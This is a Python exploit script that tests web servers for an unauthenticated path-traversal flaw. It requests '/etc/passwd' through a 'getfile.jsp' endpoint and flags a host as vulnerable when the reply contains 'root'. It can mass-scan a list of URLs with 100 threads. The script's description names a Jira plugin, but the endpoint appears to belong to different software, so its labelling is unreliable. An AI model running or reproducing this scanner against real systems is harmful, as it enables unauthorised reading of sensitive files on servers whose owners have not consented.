# -*- coding: utf-8 -*-
import argparse, sys, requests
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
}


def poc(target):
    url = target + "/public/getfile.jsp?user=1&prop=activex&filename=../../../../../../../../../../../../etc/passwd&extname= "
    try:
        res1 = requests.get(url, headers=headers, verify=False, timeout=5).text
        if "root" in res1 :
            print(f"[+] {target} is vulnable!")
        else:
            print(f"[+] {target} is not vulnable!")
    except:
        pass


def main():
    parser = argparse.ArgumentParser(
        description='STAGIL Navigation for Jira - Menu & Themes plugin unauthenticated download')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()
